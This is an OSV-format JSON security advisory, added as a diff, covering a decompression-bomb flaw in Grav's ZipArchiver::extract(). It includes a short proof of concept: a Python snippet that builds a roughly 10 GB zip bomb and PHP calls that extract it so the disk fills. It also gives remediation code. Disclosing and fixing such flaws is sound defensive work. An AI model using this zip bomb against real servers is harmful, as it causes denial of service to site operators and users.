@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-928x-9mpw-8h56",
+  "modified": "2026-09-02T21:35:43Z",
+  "published": "2026-09-02T21:35:43Z",
+  "aliases": [
+    "CVE-2026-61690"
+  ],
+  "summary": "Grav: Decompression Bomb via ZipArchiver - Missing Extraction Limits",
+  "details": "## Summary\n`ZipArchiver::extract()` lacks limits on uncompressed size, file count, and nesting depth, creating a distinct, unpatched variant of the GHSA-2vcx-h8p2-9pg9 zip bomb vulnerability. While the parallel method Installer::unZip() received comprehensive limits, ZipArchiver::extract() remains unprotected, leaving a separate code path vulnerable to the same attack vector. The vulnerability is a distinct, unpatched variant of the bug described in GHSA-2vcx-h8p2-9pg9, as it affects a separate code path in the same codebase, implementing the same abstract class.\n\n---\n\n## Details\n\n**Vulnerable code** - `system/src/Grav/Common/Filesystem/ZipArchiver.php:29-58`:\n\n```php\npublic function extract($destination, ?callable $status = null)\n{\n    $zip = new ZipArchive();\n    $archive = $zip->open($this->archive_file);\n\n    if ($archive === true) {\n        Folder::create($destination);\n\n        // Only guards against Zip Slip (path traversal)\n        for ($i = 0, $count = $zip->count(); $i < $count; $i++) {\n            $name = $zip->getNameIndex($i);\n            if ($name !== false && !$this->isSafeEntryPath($name)) {\n                $zip->close();\n                throw new RuntimeException(...);\n            }\n        }\n\n        // Extracts EVERYTHING — no size, count, or depth limit\n        if (!$zip->extractTo($destination)) { ... }\n\n        $zip->close();\n        return $this;\n    }\n}\n```\n\n**What's missing vs `Installer::unZip()`**:\n\n| Protection | `Installer::unZip()` | `ZipArchiver::extract()` |\n|-----------|---------------------|------------------------|\n| Zip Slip guard | ✅ | ✅ |\n| Max uncompressed size | ✅ (1 GiB) | ❌ |\n| Max file count | ✅ (50000) | ❌ |\n| Max nesting depth | ✅ (48) | ❌ |\n| Pre-extraction validation | ✅ All entries validated first | ❌ Extracts immediately |\n\n**The fix applied to Installer** (GHSA-2vcx, `Installer.php:178-269`):\n\n```php\n// GHSA-2vcx-h8p2-9pg9: bound what extractTo() will write to disk.\n$limits = $this->archiveLimits();\n$size = $count = $depth = 0;\n\nfor ($i = 0; $i < $numFiles; $i++) {\n    $entryName = $zip->getNameIndex($i);\n    // Check size, count, and depth BEFORE extracting anything\n    if ($limits['maxSize'] > 0) { $size += $entry['size']; }\n    if ($limits['maxDepth'] > 0) { ... }\n    if ($limits['maxFiles'] > 0) { $count++; }\n    // Reject if any limit exceeded\n}\n// Only now: $zip->extractTo($destination);\n```\n\nNone of this validation exists in `ZipArchiver::extract()`.\n\n**Reachability**: `ZipArchiver::extract()` is a public method on a concrete class, accessible via the `Archiver::create('zip')` factory. While no first-party Grav code currently calls `extract()` on a `ZipArchiver` instance, third-party plugins and custom code that use the `Archiver` abstraction for ZIP restoration will walk directly into this unprotected path.\n\n---\n\n## Proof of Concept\n\n### Step 1 - Create a zip bomb\n\n```bash\n# Create a 10 GB zip bomb (42 kB compressed)\npython3 -c \"\nimport zipfile, os\nz = zipfile.ZipFile('/tmp/zipbomb.zip', 'w', zipfile.ZIP_DEFLATED)\nzeros = b'\\x00' * (1024 * 1024 * 1024)  # 1 GB of zeros\nfor i in range(10):\n    z.writestr(f'file_{i}.txt', zeros)\nz.close()\n\"\nls -lh /tmp/zipbomb.zip\n# Output: 42K /tmp/zipbomb.zip  →  expands to 10 GB\n```\n\n### Step 2 - Extract via ZipArchiver\n\n```php\n$archiver = Archiver::create('zip');\n$archiver->setArchive('/tmp/zipbomb.zip');\n$archiver->extract('/tmp/extracted');  // ← no limits, fills disk\n```\n\nThe server's disk fills with 10 GB of data. If the web root shares the disk, the site becomes unavailable (DoS).\n\n---\n\n## Impact\n\nAny code path that extracts a user-supplied ZIP archive through `ZipArchiver::extract()` will write the entire archive to disk without limits. A 42 KB zip bomb can expand to fill available disk space, causing denial of service. On systems where the extraction directory shares a partition with the web root, the entire site becomes unavailable.\n\n---\n\n## Remediation\n\nApply the same `archiveLimits()` validation from `Installer::unZip()` to `ZipArchiver::extract()`:\n\n```php\npublic function extract($destination, ?callable $status = null)\n{\n    $zip = new ZipArchive();\n    $archive = $zip->open($this->archive_file);\n\n    if ($archive === true) {\n        Folder::create($destination);\n\n        // Apply the same archive limits as Installer::unZip()\n        $limits = $this->archiveLimits();\n        $totalSize = 0;\n        $totalFiles = 0;\n\n        for ($i = 0, $count = $zip->count(); $i < $count; $i++) {\n            $name = $zip->getNameIndex($i);\n            if ($name === false) continue;\n\n            // Zip Slip guard (existing)\n            if (!$this->isSafeEntryPath($name)) {\n                $zip->close();\n                throw new RuntimeException(...);\n            }\n\n            // Decompression bomb guards (NEW)\n            $stat = $zip->statIndex($i);\n            $totalSize += $stat['size'] ?? 0;\n            $totalFiles++;\n\n            $depth = count(explode('/', trim($name, '/')));\n            if ($limits['maxDepth'] > 0 && $depth > $limits['maxDepth']) {\n                $zip->close();\n                throw new RuntimeException('Archive exceeds max nesting depth');\n            }\n        }\n\n        if ($limits['maxSize'] > 0 && $totalSize > $limits['maxSize']) {\n            $zip->close();\n            throw new RuntimeException('Archive exceeds max uncompressed size');\n        }\n        if ($limits['maxFiles'] > 0 && $totalFiles > $limits['maxFiles']) {\n            $zip->close();\n            throw new RuntimeException('Archive exceeds max file count');\n        }\n\n        if (!$zip->extractTo($destination)) { ... }\n        $zip->close();\n        return $this;\n    }\n}\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-928x-9mpw-8h56"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-61690"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/1c1003cfcab5344203d6fde1aaa1f9a4ee3413ff"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/releases/tag/2.0.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-409"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-02T21:35:43Z",
+    "nvd_published_at": "2026-08-19T16:18:16Z"
+  }
+}
